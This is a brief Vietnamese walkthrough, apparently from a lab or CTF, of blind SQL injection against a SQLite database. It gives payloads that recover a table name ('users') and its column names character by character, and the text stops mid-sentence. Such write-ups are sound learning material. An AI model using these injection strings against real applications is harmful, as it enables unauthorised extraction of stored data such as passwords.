# SQL injection - Blind


Tiếp theo xác định tên bảng
```sql
' or substr((select name from sqlite_master where type='table'),1,1)='a' -- -
```
Và kết quả được bảng tên users

(hình ảnh bảng users)

Tiếp theo xác định cột
```sql
' or substr((SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 1),1,1)='a' -- -
```
và 
```sql
' or substr((SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 2),1,1)='a' -- -
```
Chúng ta được 2 cột là password và 
